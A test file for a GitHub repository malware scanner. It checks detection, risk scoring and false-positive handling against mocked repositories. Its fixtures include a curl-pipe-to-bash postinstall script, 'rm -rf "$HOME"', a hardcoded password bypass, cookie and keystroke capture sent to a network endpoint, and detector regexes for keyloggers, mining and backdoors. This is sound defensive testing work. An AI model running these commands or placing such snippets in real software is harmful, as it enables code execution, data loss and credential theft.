/**
 * Integration tests for scanGitHubRepo.
 *
 * Drives the full scan through a mocked GitHub API (fetch), verifying that the
 * detectors and risk scoring actually fire end-to-end on representative
 * benign-but-detectable fixtures — no real network, no real malware.
 */

import { afterEach, describe, expect, it, vi } from "vitest"
import { scanGitHubRepo } from "../src/github/repo-scanner"
import type { SignatureDatabase } from "../src/types/index"

const EMPTY_SIGNATURES: SignatureDatabase = {
  version: "test",
  lastUpdated: new Date(),
  maliciousPackages: [],
  yaraRules: [],
  knownBadHashes: []
}

const MOCK_COMMIT_SHA = "0123456789abcdef0123456789abcdef01234567"

/** Build a fetch mock that serves an in-memory file tree as the GitHub API. */
function mockGitHubApi(files: Record<string, string>, sizes: Record<string, number> = {}) {
  return vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input)

    if (url.includes("api.npmjs.org")) {
      return new Response(JSON.stringify({ downloads: 500_000 }), { status: 200 })
    }
    if (/\/commits\/[^/]+$/.test(url)) {
      return new Response(JSON.stringify({ sha: MOCK_COMMIT_SHA }), { status: 200 })
    }
    if (url.includes("/git/trees/")) {
      const tree = Object.keys(files).map((path) => ({
        path,
        type: "blob" as const,
        sha: path,
        size: sizes[path],
        url: path
      }))
      return new Response(JSON.stringify({ sha: "x", truncated: false, tree }), {
        status: 200
      })
    }
    const contentMatch = url.match(/\/contents\/(.+?)\?ref=/)
    if (contentMatch) {
      const path = decodeURIComponent(contentMatch[1]!)
      const content = files[path]
      if (content === undefined) return new Response("{}", { status: 404 })
      const b64 = Buffer.from(content, "utf-8").toString("base64")
      return new Response(JSON.stringify({ content: b64 }), { status: 200 })
    }
    return new Response("{}", { status: 404 })
  })
}

const repoInfo = {
  owner: "acme",
  repo: "sample",
  branch: "main",
  url: "https://github.com/acme/sample"
}

async function scan(files: Record<string, string>) {
  global.fetch = mockGitHubApi(files) as unknown as typeof fetch
  return scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
}

afterEach(() => {
  vi.restoreAllMocks()
})

describe("scanGitHubRepo integration", () => {
  it("returns low risk and no findings for a clean repo", async () => {
    const result = await scan({
      "src/index.js": `export function add(a, b) {\n  return a + b\n}\n`
    })
    expect(result.riskLevel).toBe("low")
    expect(result.findings).toHaveLength(0)
    expect(result.safeToClone).toBe(true)
    expect(result.scanSummary.filesScanned).toBe(1)
  })

  it("keeps benign llmfit UI and installer patterns low risk", async () => {
    const result = await scan({
      "llmfit-desktop/ui/app.js": [
        `document.addEventListener('keydown', (e) => {`,
        `  if (e.key === 'Escape') closeModal()`,
        `})`,
      ].join("\n"),
      "llmfit-desktop/ui/i18n.js": [
        `const LOCALE_KEY = 'llmfit.locale'`,
        `const stored = window.localStorage.getItem(LOCALE_KEY)`,
      ].join("\n"),
      "install.sh": [
        `TMPDIR="$(mktemp -d)"`,
        `trap 'rm -rf "$TMPDIR"' EXIT`,
      ].join("\n"),
    })

    expect(result.findings).toHaveLength(0)
    expect(result.riskScore).toBe(0)
    expect(result.riskLevel).toBe("low")
    expect(result.safeToClone).toBe(true)
  })

  it("pins the whole scan to one commit SHA (TOCTOU)", async () => {
    global.fetch = mockGitHubApi({
      "src/index.js": `export const x = 1\n`
    }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })

    // The verdict carries the scanned commit…
    expect(result.commitSha).toBe(MOCK_COMMIT_SHA)

    // …and every tree/content request was made against that SHA, never the
    // mutable branch name.
    const urls = (global.fetch as ReturnType<typeof vi.fn>).mock.calls.map((c) => String(c[0]))
    const treeUrl = urls.find((u) => u.includes("/git/trees/"))
    expect(treeUrl).toContain(`/git/trees/${MOCK_COMMIT_SHA}`)
    for (const u of urls.filter((u) => u.includes("/contents/"))) {
      expect(u).toContain(`ref=${MOCK_COMMIT_SHA}`)
    }
  })

  it("flags a critical backdoor (hardcoded auth bypass)", async () => {
    const result = await scan({
      "src/auth.js": `export function ok(password) {\n  if (password == "letmein") {\n    return true\n  }\n  return false\n}\n`
    })
    const backdoor = result.findings.find((f) => f.type === "BACKDOOR")
    expect(backdoor).toBeDefined()
    expect(backdoor!.severity).toBe("critical")
  })

  it("flags data exfiltration (cookie + keylogger)", async () => {
    const result = await scan({
      "src/t.js": `export function grab() {\n  const c = document.cookie\n  document.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n  return c\n}\n`
    })
    const exfil = result.findings.find((f) => f.type === "DATA_EXFILTRATION")
    expect(exfil).toBeDefined()
    expect(exfil!.severity).toBe("critical")
    // Evidence pinpoints the matched lines for display and #L deep links.
    expect(exfil!.evidence).toEqual([
      { line: 2, code: "const c = document.cookie" },
      { line: 3, code: `document.addEventListener("keydown", (e) => sendCapturedKey(e.key))` }
    ])
  })

  it("flags sensitive browser storage sent to a network sink", async () => {
    const result = await scan({
      "src/session.js": [
        `const token = localStorage.getItem("auth_token")`,
        `fetch("https://example.test/collect", { method: "POST", body: token })`,
      ].join("\n"),
    })
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        type: "DATA_EXFILTRATION",
        severity: "high",
        description: expect.stringContaining("Sensitive Storage Transmission"),
      })
    )
  })

  it("still flags deletion of a broad user path", async () => {
    const result = await scan({ "cleanup.sh": `rm -rf "$HOME"\n` })
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        type: "SUSPICIOUS_FILE_ACCESS",
        confidence: "medium",
        description: expect.stringContaining("Destructive File Deletion"),
      })
    )
  })

  it("flags a supply-chain postinstall that fetches over the network", async () => {
    const result = await scan({
      "package.json": JSON.stringify({
        name: "sample",
        scripts: { postinstall: "curl https://example.com/setup.sh | bash" }
      })
    })
    const postinstall = result.findings.find((f) => f.type === "POSTINSTALL_SCRIPT")
    expect(postinstall).toBeDefined()
    expect(postinstall!.severity).toBe("high")
  })

  it("scores a repo with multiple critical findings as high risk", async () => {
    const result = await scan({
      "package.json": JSON.stringify({
        name: "sample",
        scripts: { postinstall: "curl https://example.com/x.sh | bash" }
      }),
      "src/auth.js": `if (password == "admin123") { return true }\n`,
      "src/t.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n`
    })
    expect(result.riskLevel).toBe("high")
    expect(result.safeToClone).toBe(false)
    expect(result.findings.length).toBeGreaterThanOrEqual(3)
  })
})

describe("malicious package version bounds", () => {
  const signatures: SignatureDatabase = {
    ...EMPTY_SIGNATURES,
    maliciousPackages: [{
      name: "event-stream",
      version: "3.3.6",
      severity: "high",
      source: "test",
    }],
  }

  async function scanDependency(version: string) {
    global.fetch = mockGitHubApi({
      "package.json": JSON.stringify({ dependencies: { "event-stream": version } }),
    }) as unknown as typeof fetch
    return scanGitHubRepo(repoInfo, { signatures })
  }

  it("detects an affected exact version", async () => {
    const result = await scanDependency("3.3.6")
    expect(result.findings).toContainEqual(expect.objectContaining({
      type: "SUSPICIOUS_DEPENDENCY",
      package: "event-stream",
    }))
  })

  it("does not flag an unaffected exact version", async () => {
    const result = await scanDependency("4.0.1")
    expect(result.findings.filter((finding) =>
      finding.type === "SUSPICIOUS_DEPENDENCY"
    )).toHaveLength(0)
  })
})

describe("obfuscation signal dedupe + rule thresholds", () => {
  const BASE64_HEAVY_RULE = {
    id: "OBF_BASE64_HEAVY",
    name: "Heavy Base64 Encoding",
    pattern: "[A-Za-z0-9+/]{50,}={0,2}",
    description: "6+ base64 strings of 50+ chars in a single file.",
    tags: ["base64", "obfuscation"],
    severity: "medium" as const
  }
  const blob = () => "QUFB" + "a".repeat(60) // >50 base64-ish chars
  const heavyBase64File = Array.from({ length: 7 }, (_, i) => `const c${i} = "${blob()}"`).join("\n")

  it("counts a base64-heavy file once when the rule ships in signatures", async () => {
    global.fetch = mockGitHubApi({ "src/enc.js": heavyBase64File }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, {
      signatures: {
        ...EMPTY_SIGNATURES,
        yaraRules: [{ ...BASE64_HEAVY_RULE, minMatches: 6, fileExtensions: [".js", ".ts"] }]
      }
    })
    const base64Findings = result.findings.filter(
      (f) => f.pattern === "OBF_BASE64_HEAVY" || f.description.includes("Base64")
    )
    expect(base64Findings).toHaveLength(1)
    expect(base64Findings[0]!.pattern).toBe("OBF_BASE64_HEAVY")
  })

  it("keeps the built-in base64 check as fallback when signatures lack the rule", async () => {
    global.fetch = mockGitHubApi({ "src/enc.js": heavyBase64File }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
    const base64Findings = result.findings.filter((f) => f.description.includes("Base64"))
    expect(base64Findings).toHaveLength(1)
    expect(base64Findings[0]!.type).toBe("OBFUSCATED_CODE")
  })

  it("honors minMatches — a single base64 string is not a signal", async () => {
    global.fetch = mockGitHubApi({
      "src/one.js": `const key = "${blob()}"\n`
    }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, {
      signatures: { ...EMPTY_SIGNATURES, yaraRules: [{ ...BASE64_HEAVY_RULE, minMatches: 6 }] }
    })
    expect(result.findings.filter((f) => f.pattern === "OBF_BASE64_HEAVY")).toHaveLength(0)
  })

  it("honors fileExtensions — rules scoped to code files skip others", async () => {
    global.fetch = mockGitHubApi({ "setup.py": heavyBase64File }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, {
      signatures: {
        ...EMPTY_SIGNATURES,
        yaraRules: [{ ...BASE64_HEAVY_RULE, minMatches: 6, fileExtensions: [".js"] }]
      }
    })
    expect(result.findings.filter((f) => f.pattern === "OBF_BASE64_HEAVY")).toHaveLength(0)
  })

  it("dedupes exfil/backdoor signals against loaded rules (one finding per signal)", async () => {
    const rules = [
      { id: "EXFIL_COOKIE", name: "Cookie Access", pattern: "document\\.cookie", description: "Reads cookies", tags: ["exfiltration"], severity: "high" as const },
      { id: "EXFIL_KEYLOGGER", name: "Keylogger", pattern: "(?:addEventListener|on)\\s*\\(\\s*['\\\"](?:keydown|keypress|keyup)['\\\"]", description: "Captures keystrokes", tags: ["exfiltration"], severity: "critical" as const },
      { id: "BACKDOOR_HARDCODED_AUTH", name: "Auth Bypass", pattern: "(?:password|auth)\\s*(?:===?|==)\\s*['\\\"][^'\\\"]{0,20}['\\\"]\\s*\\)", description: "Hardcoded auth", tags: ["backdoor"], severity: "critical" as const }
    ]
    global.fetch = mockGitHubApi({
      "src/evil.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\nif (password == "letmein") { return true }\n`
    }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, {
      signatures: { ...EMPTY_SIGNATURES, yaraRules: rules }
    })
    // The rules own the signals — no built-in DATA_EXFILTRATION/BACKDOOR twins.
    expect(result.findings.filter((f) => f.type === "DATA_EXFILTRATION")).toHaveLength(0)
    expect(result.findings.filter((f) => f.type === "BACKDOOR")).toHaveLength(0)
    const ruleHits = result.findings.filter((f) => f.type === "MALWARE_SIGNATURE").map((f) => f.pattern).sort()
    expect(ruleHits).toEqual(["BACKDOOR_HARDCODED_AUTH", "EXFIL_COOKIE", "EXFIL_KEYLOGGER"])
    expect(result.riskLevel).toBe("high") // critical findings still floor to high
  })

  it("does not inflate benign storage reads and scoped cleanup into medium risk", async () => {
    // Base64 remains a real heuristic signal, but a generic preference read
    // and deletion of one application-owned file are no longer called
    // exfiltration/destructive behavior.
    global.fetch = mockGitHubApi({
      "src/encoder.js": heavyBase64File,
      "src/analytics.js": `const d = localStorage.getItem("k")\nconst v = input.value\n`,
      "src/cleanup.js": `const fs = require("node:fs")\nfs.unlinkSync("/tmp/x")\n`
    }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, {
      signatures: {
        ...EMPTY_SIGNATURES,
        yaraRules: [{ ...BASE64_HEAVY_RULE, minMatches: 6, fileExtensions: [".js", ".ts"] }]
      }
    })
    expect(result.findings.every((f) => f.severity === "medium")).toBe(true)
    expect(result.riskLevel).toBe("low")
  })
})

describe("self-scan guardrail (regex literals are inert data)", () => {
  it("does not flag a file of detector-style regex definitions", async () => {
    const result = await scan({
      // The shape of this scanner's own source: regexes DESCRIBING malicious
      // patterns, plus regex-based detection tables.
      "src/detectors.ts": [
        `const exfil = [`,
        `  { pattern: /(?:addEventListener|on)\\s*\\(\\s*['"](?:keydown|keypress|keyup)['"]/gi, type: "Keylogger" },`,
        `  { pattern: /document\\.cookie/gi, type: "Cookie Access" },`,
        `]`,
        `const mining = /coinhive|monero|stratum\\+tcp/gi`,
        `const backdoor = /(?:password|auth)\\s*(?:===?|==)\\s*['"][^'"]{0,20}['"]\\s*\\)/gi`,
        `export { exfil, mining, backdoor }`
      ].join("\n")
    })
    expect(result.findings).toHaveLength(0)
    expect(result.riskLevel).toBe("low")
  })

  it("still flags the same signals as real calls", async () => {
    const result = await scan({
      "src/payload.js": `document.addEventListener("keydown", (e) => sendCapturedKey(e.key))\nconst c = document.cookie\n`
    })
    expect(result.findings.find((f) => f.type === "DATA_EXFILTRATION")).toBeDefined()
  })

  it("relaxes string-literal fixtures in test files, but not in src/", async () => {
    const KEYLOGGER_RULE = {
      id: "EXFIL_KEYLOGGER",
      name: "Keylogger",
      pattern: `(?:addEventListener|on)\\s*\\(\\s*['"](?:keydown|keypress|keyup)['"]`,
      description: "Keyboard event listener",
      tags: ["keylogger"],
      severity: "critical" as const
    }
    const signatures = { ...EMPTY_SIGNATURES, yaraRules: [KEYLOGGER_RULE] }
    const fixture = `document.addEventListener("keydown", (e) => sendCapturedKey(e.key))`

    // In a TEST file the attack shape appears in fixture strings — inert
    // inputs that exercise detectors — so it must not fire.
    global.fetch = mockGitHubApi({
      "tests/detector.test.ts": "const f = `" + fixture + "`\nexpect(scan(f))\n"
    }) as unknown as typeof fetch
    expect((await scanGitHubRepo(repoInfo, { signatures })).findings).toHaveLength(0)

    // The identical text in a SRC file is treated as real and fires. (Note:
    // string masking is scoped to test files; this rule keys on the string
    // argument, so relaxing test-file strings intentionally trades away
    // detection of this pattern *within test files* — see the file loop.)
    global.fetch = mockGitHubApi({ "src/handler.js": fixture + "\n" }) as unknown as typeof fetch
    const src = await scanGitHubRepo(repoInfo, { signatures })
    expect(src.findings.map((f) => f.pattern)).toContain("EXFIL_KEYLOGGER")
    expect(src.riskLevel).toBe("high")
  })
})

describe("scan transparency (scanned/skipped tracking)", () => {
  it("lists exactly which files were scanned and which were skipped, with reasons", async () => {
    const result = await scan({
      "src/index.js": `export const a = 1\n`,
      "README.md": `# readme\n`,
      "LICENSE": `MIT\n`,
      "logo.png": ``
    })
    expect(result.scanSummary.scannedFiles).toEqual(["src/index.js"])
    expect(result.scanSummary.filesScanned).toBe(1)
    expect(result.scanSummary.skippedFiles).toEqual([
      { path: "README.md", reason: "unsupported-type" },
      { path: "LICENSE", reason: "unsupported-type" },
      { path: "logo.png", reason: "unsupported-type" }
    ])
    expect(result.scanSummary.skippedCount).toBe(3)
    expect(result.scanSummary.treeTruncated).toBe(false)
  })

  it("skips files past the per-scan cap with over-file-limit", async () => {
    const files: Record<string, string> = {}
    for (let i = 0; i < 205; i++) files[`src/f${String(i).padStart(3, "0")}.js`] = `export const x = ${i}\n`
    const result = await scan(files)
    expect(result.scanSummary.filesScanned).toBe(200)
    expect(result.scanSummary.scannedFiles).toHaveLength(200)
    const overLimit = result.scanSummary.skippedFiles.filter((f) => f.reason === "over-file-limit")
    expect(overLimit).toHaveLength(5)
    expect(result.scanSummary.skippedCount).toBe(5)
  })

  it("skips oversized blobs with too-large instead of fetching them", async () => {
    global.fetch = mockGitHubApi(
      { "src/small.js": `export const a = 1\n`, "dist/bundle.js": `x` },
      { "dist/bundle.js": 5 * 1024 * 1024 }
    ) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
    expect(result.scanSummary.scannedFiles).toEqual(["src/small.js"])
    expect(result.scanSummary.skippedFiles).toEqual([
      { path: "dist/bundle.js", reason: "too-large" }
    ])
    // The oversized blob's contents were never requested.
    const urls = (global.fetch as ReturnType<typeof vi.fn>).mock.calls.map((c) => String(c[0]))
    expect(urls.some((u) => u.includes("/contents/dist/bundle.js"))).toBe(false)
  })

  it("records fetch failures as fetch-failed and does not count them as scanned", async () => {
    // "src/gone.js" is in the tree but the contents API 404s for it.
    const api = mockGitHubApi({ "src/ok.js": `export const a = 1\n` })
    global.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = String(input)
      if (url.includes("/git/trees/")) {
        const tree = ["src/ok.js", "src/gone.js"].map((path) => ({
          path,
          type: "blob" as const,
          sha: path,
          url: path
        }))
        return new Response(JSON.stringify({ sha: "x", truncated: false, tree }), { status: 200 })
      }
      return api(input)
    }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
    expect(result.scanSummary.scannedFiles).toEqual(["src/ok.js"])
    expect(result.scanSummary.filesScanned).toBe(1)
    expect(result.scanSummary.skippedFiles).toEqual([
      { path: "src/gone.js", reason: "fetch-failed" }
    ])
  })

  it("exposes the pre-clamp rawRiskScore so deductions reconcile with the score", async () => {
    const result = await scan({
      "src/index.js": `export const a = 1\n`
    })
    expect(result.rawRiskScore).toBe(0)
    expect(result.riskScore).toBe(0)
  })

  it("factors are deduped signal contributions that sum to rawRiskScore", async () => {
    const result = await scan({
      "package.json": JSON.stringify({
        name: "sample",
        scripts: { postinstall: "curl https://example.com/x.sh | bash" }
      }),
      "src/a.js": `const c = document.cookie\n`,
      "src/b.js": `const c = document.cookie\n`
    })
    expect(result.findings.length).toBeGreaterThan(result.factors.length)
    const factorTotal = result.factors.reduce((sum, f) => sum + f.weight, 0)
    expect(factorTotal).toBeCloseTo(result.rawRiskScore, 10)
    const merged = result.factors.find((f) => f.description.includes("counted once"))
    expect(merged).toBeDefined()
  })
})

describe("hardcoded-IP detection (false-positive guardrails)", () => {
  it("does not flag invalid or over-long dotted numbers as IPs", async () => {
    const result = await scan({
      // impossible octets and a 5-part version string — neither is a valid IPv4
      "src/v.js": `export const A = "999.999.999.999"\nexport const BUILD = "10.20.30.40.50"\n`
    })
    const netFinding = result.findings.find(
      (f) => f.type === "NETWORK_COMMUNICATION"
    )
    expect(netFinding).toBeUndefined()
  })

  it("flags a genuine hardcoded public IP", async () => {
    const result = await scan({
      "src/net.js": `export const HOST = "203.0.113.42"\nfetch("http://" + HOST)\n`
    })
    const netFinding = result.findings.find(
      (f) => f.type === "NETWORK_COMMUNICATION"
    )
    expect(netFinding).toBeDefined()
  })

  it("treats 0.0.0.0 as a wildcard bind address, not outbound C2", async () => {
    const result = await scan({
      "run.py": `app.run(host='0.0.0.0', port=5000)\n`
    })
    expect(result.findings.find((f) => f.type === "NETWORK_COMMUNICATION")).toBeUndefined()
  })
})

describe("deployment configuration without malware inflation", () => {
  const SECRET_RULE = {
    id: "HARDCODED_API_KEY",
    name: "Hardcoded API Key",
    pattern:
      "(?:api[_-]?key|apikey|secret[_-]?key|auth[_-]?token|private[_-]?key)\\s*[:=]\\s*['\"]([^'\"]{20,})['\"]",
    description: "Generic API key / secret key pattern assigned to a variable",
    tags: ["secrets"],
    severity: "critical" as const,
    fileExtensions: [".py"],
  }

  it("keeps the reproduced SPY dashboard findings low risk and safe to clone", async () => {
    global.fetch = mockGitHubApi({
      "app.py": [
        `app.secret_key = 'your-secret-key-change-in-production'`,
        `app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)`,
      ].join("\n"),
      "run.py": [
        `app.run(`,
        `    debug=True,`,
        `    host='0.0.0.0',`,
        `    port=5000,`,
        `)`,
      ].join("\n"),
      "requirements.txt": "Flask==3.0.0\npandas==2.1.4\n",
      "templates/index.html": `<script>fetch('/api/options')</script>`,
    }) as unknown as typeof fetch

    const result = await scanGitHubRepo(repoInfo, {
      signatures: { ...EMPTY_SIGNATURES, yaraRules: [SECRET_RULE] },
    })

    expect(result.scanSummary.scannedFiles).toContain("templates/index.html")
    expect(result.findings).toHaveLength(3)
    expect(result.findings.every((finding) =>
      finding.type === "INSECURE_CONFIGURATION" &&
      finding.severity === "low" &&
      finding.cloneBlocking === false
    )).toBe(true)
    expect(result.riskLevel).toBe("low")
    expect(result.safeToClone).toBe(true)
    expect(result.findings.find((finding) => finding.file === "run.py")?.evidence).toEqual([
      { line: 2, code: "debug=True," },
      { line: 3, code: "host='0.0.0.0'," },
    ])
  })

  it("downgrades placeholders even when a cached signature set lacks the rule", async () => {
    const result = await scan({
      "app.py": `app.secret_key = 'your-secret-key-change-in-production'\n`,
    })
    expect(result.findings).toEqual([
      expect.objectContaining({
        type: "INSECURE_CONFIGURATION",
        severity: "low",
        cloneBlocking: false,
      }),
    ])
    expect(result.safeToClone).toBe(true)
  })

  it("scans inline JavaScript in HTML with JavaScript-scoped rules", async () => {
    const keyloggerRule = {
      id: "EXFIL_KEYLOGGER",
      name: "Keyboard Capture and Transmission",
      pattern:
        "(?:addEventListener\\s*\\(\\s*['\"](?:keydown|keypress|keyup)['\"]|\\.on(?:keydown|keypress|keyup)\\s*=)",
      description: "Reads and transmits pressed keys",
      tags: ["keylogger"],
      severity: "critical" as const,
      context: "keyboard-capture" as const,
      fileExtensions: [".js"],
    }
    global.fetch = mockGitHubApi({
      "templates/index.html": [
        `<button title="keydown is supported">Copy</button>`,
        `<script>`,
        `document.addEventListener('keydown', event => {`,
        `  fetch('/collect', { method: 'POST', body: event.key })`,
        `})`,
        `</script>`,
      ].join("\n"),
    }) as unknown as typeof fetch

    const result = await scanGitHubRepo(repoInfo, {
      signatures: { ...EMPTY_SIGNATURES, yaraRules: [keyloggerRule] },
    })
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        file: "templates/index.html",
        pattern: "EXFIL_KEYLOGGER",
        severity: "critical",
      })
    )
  })
})
